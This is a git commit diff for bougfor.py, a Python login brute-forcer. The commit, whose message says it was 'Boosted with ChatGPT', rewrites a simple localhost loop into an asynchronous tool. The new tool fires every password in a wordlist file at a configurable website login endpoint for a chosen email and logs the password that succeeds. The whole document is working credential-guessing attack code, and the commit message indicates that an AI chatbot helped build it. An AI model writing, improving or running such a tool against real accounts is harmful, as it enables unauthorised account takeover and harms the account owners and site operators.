274dfe0fa647372f089945d65913549e7f8d285d
pyxl <pyxl@skill.issue>
2023-01-17 17:04:57 +0100

    Boosted with ChatGPT

--- bougfor.py
+++ bougfor.py
@@ -1,28 +1,49 @@
-#!/bin/python3
-
-import requests
+import argparse
+import asyncio
+import aiohttp
+import logging
 from colorama import Fore
+from tqdm import tqdm
 
-def send_request(url, endpoint, username, password):
-  response = requests.post(f"{url}{endpoint}", json={"username": username, "password": password})
-  return response.json()
+async def brute_force(url, endpoint, username, wordlist):
+    queue = asyncio.Queue()
+    tasks = [asyncio.ensure_future(send_request(url, endpoint, username, password, queue)) for password in tqdm(wordlist)]
+    for _ in asyncio.as_completed(tasks):
+        result, password = await queue.get()
+        if "message" in result:
+            logging.info(f"{username}:{password} => {result['message']}")
+        else:
+            logging.info(f"{username}:{password} => {result}")
+            break
 
-def brute_force(url, endpoint, username, wordlist):
-  for password in wordlist:
-    result = send_request(url, endpoint, username, password)
-    if "message" in result:
-      print(f"{Fore.RED}{username}:{password} => {result['message']}")
-    else:
-      print(f"{Fore.GREEN}{username}:{password} => {result}")
-      break
+async def send_request(url, endpoint, username, password, queue):
+    async with aiohttp.ClientSession() as session:
+        async with session.post(f"{url}{endpoint}", json={"email": username, "password": password}) as resp:
+            result = await resp.json()
+            queue.put_nowait((result, password))
+            return result
+
+
+
+def read_wordlist(filename):
+    with open(filename, "r") as file:
+        return file.read().splitlines()
+
+def setup_logging(log_file):
+    logging.basicConfig(level=logging.INFO, filename=log_file, filemode="w",
+                        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s")
 
 if __name__ == "__main__":
+    parser = argparse.ArgumentParser()
+    parser.add_argument("-u", "--username", help="username for the account", default="foo@bar.com")
+    parser.add_argument("-w", "--wordlist", help="wordlist for brute force", default="wordlist.txt")
+    parser.add_argument("-U", "--url", help="url for the website", default="https://foo.bar")
+    parser.add_argument("-e", "--endpoint", help="endpoint for login", default="/account/login")
+    parser.add_argument("-l", "--log", help="log file", default="brute_force.log")
+    args = parser.parse_args()
 
-  username = "admin"
-  wordlist = ["password", "outloooook", "adminadminadmin", "ojjqnhzosdnvnZHBRI"]
+    setup_logging(args.log)
 
-  url = "http://localhost:9000"
-
-  endpoint = "/api/auth"
-
-  brute_force(url, endpoint, username, wordlist)
+    wordlist = read_wordlist(args.wordlist)
+    loop = asyncio.get_event_loop()
+    loop.run_until_complete(brute_force(args.url, args.endpoint, args.username, wordlist))
